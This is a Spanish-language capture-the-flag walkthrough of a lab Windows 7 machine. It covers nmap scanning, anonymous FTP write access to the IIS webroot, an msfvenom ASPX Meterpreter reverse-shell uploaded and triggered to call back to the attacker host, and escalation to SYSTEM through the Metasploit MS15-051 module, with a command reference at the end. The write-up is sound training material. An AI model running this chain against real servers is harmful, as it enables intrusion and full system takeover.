// 01

Reconocimiento y FTP

1
RECONOCIMIENTO
NMAP
$ sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.191
21/tcp open ftp Microsoft ftpd
80/tcp open http Microsoft IIS httpd 7.5

// NOTA

FTP + IIS en la misma máquina es una combinación con una hipótesis clara: si el FTP escribe donde el IIS lee, cualquier fichero subido es una posible ejecución.

2
CONFIRMAR QUE EL FTP ES EL WEBROOT
FTP
$ curl -s 'ftp://10.129.5.191/' --user 'anonymous:anonymous'
03-18-17 02:06AM <DIR> aspnet_client
03-17-17 05:37PM 689 iisstart.htm
03-17-17 05:37PM 184946 welcome.png

// FTP ANÓNIMO SOBRE EL WEBROOT

Dónde: FTP acepta anonymous:anonymous y el listado coincide exactamente con los ficheros por defecto de IIS.
Qué permite: el directorio raíz del FTP es C:\inetpub\wwwroot — cualquier cosa subida ahí queda servida por la web.

// 02

Webshell ASPX

3
SUBIR Y EJECUTAR LA SHELL
WEBSHELL
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f aspx -o /tmp/shell.aspx
$ curl -T /tmp/shell.aspx 'ftp://10.129.5.191/shell.aspx' --user 'anonymous:anonymous'
$ curl 'http://10.129.5.191/shell.aspx' # con el handler de msf escuchando
226 Transfer complete.
[*] Meterpreter session 1 opened (... -> 10.129.5.191)
IIS APPPOOL\Web @ DEVEL

// NOTA

IIS no distingue de dónde vino el fichero: si llega por FTP a wwwroot y tiene extensión .aspx, se interpreta y ejecuta igual que cualquier página legítima.

// 03

MS15-051 a SYSTEM

4
BUSCAR EL EXPLOIT LOCAL APLICABLE
METERPRETER
meterpreter > run post/multi/recon/local_exploit_suggester
exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.

// MS15-051 (win32k.sys)

Dónde: el controlador win32k.sys de este Windows 7 build 7600 sin hotfixes.
Qué permite: el fallo permite robar el token de un proceso SYSTEM desde un proceso de bajo privilegio (IIS APPPOOL\Web).

5
LANZAR EL EXPLOIT Y LEER LAS FLAGS
METASPLOIT
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > set SESSION 1
msf6 > exploit -j
Meterpreter session 5 opened (NT AUTHORITY\SYSTEM @ DEVEL)
[flag oculta] # C:\Users\babis\Desktop\user.txt
[flag oculta] # C:\Users\Administrator\Desktop\root.txt

// OJO

Las sesiones 2, 3 y 4 eran reconexiones del mismo payload (IIS APPPOOL\Web); la que importa es la última, la 5, que ya corre como SYSTEM — conviene listar sesiones y entrar en la correcta, no en la primera que aparece.

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: FTP anónimo con escritura en el webroot → webshell ASPX → MS15-051 → SYSTEM.

// 04

Referencia Comandos

msfvenom (ASPX)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=puerto -f aspx -o shell.aspx
Genera una webshell ASPX con un payload Meterpreter embebido.
curl -T (FTP upload)
curl -T archivo ftp://IP/nombre --user usuario:pass
Sube un archivo por FTP sin necesitar el cliente interactivo.
local_exploit_suggester
run post/multi/recon/local_exploit_suggester
Módulo de Metasploit que, desde una sesión activa, sugiere qué exploits locales son aplicables según el sistema.
exploit/windows/local/ms15_051_client_copy_image
use ... ; set SESSION N ; exploit -j
Explota MS15-051 sobre una sesión ya establecida para robar un token SYSTEM.

// 05

Glosario

Webroot compartido con FTP
Configuración donde el directorio raíz del FTP y el que sirve el servidor web son el mismo. Cualquier archivo ejecutable subido por FTP queda disponible para ejecutarse vía HTTP.
ASPX
Extensión de las páginas ASP.NET, interpretadas y ejecutadas por IIS. Una webshell ASPX se comporta como cualquier página legítima de la aplicación.
IIS APPPOOL\Web
Cuenta virtual con la que corre el application pool de un sitio IIS. Tiene privilegios limitados, el punto de partida habitual antes de escalar.
MS15-051 (win32k.sys)
Vulnerabilidad de escalada de privilegios en el controlador de ventanas de Windows, corregida en mayo de 2015. Afecta a sistemas sin ese parche instalado.
local_exploit_suggester
Módulo de Metasploit que, a partir de una sesión y la información del sistema, enumera qué módulos de escalada local tienen más probabilidad de funcionar.
